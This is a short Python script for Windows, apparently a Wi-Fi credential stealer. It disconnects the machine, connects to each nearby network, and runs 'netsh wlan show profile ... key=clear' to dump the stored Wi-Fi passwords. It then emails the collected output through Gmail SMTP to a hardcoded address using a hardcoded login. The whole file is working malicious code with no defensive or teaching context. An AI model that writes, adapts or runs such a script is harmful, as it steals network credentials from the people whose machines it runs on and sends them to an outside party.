#!/usr/bin/env python

import subprocess, smtplib, re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan disconnect"
disconnect = subprocess.check_output(command, shell=True)

command = "netsh wlan show network mode=bssid"
wifi_search = subprocess.check_output(command, shell=True)
networks_found = re.findall("(?:SSID\s\d\s:)(.*)", wifi_search)

result = ""
for networks in networks_found:
    command = "netsh wlan connect name=" + networks
    connection_established = subprocess.check_output(command, shell=True)
    if connection_established:
        command = "netsh wlan show profile " + networks + " key=clear"
        current_result = subprocess.check_output(command, shell=True)
        result = result + current_result

send_mail("watsonpriscilla012@gmail.com", "Test12", result)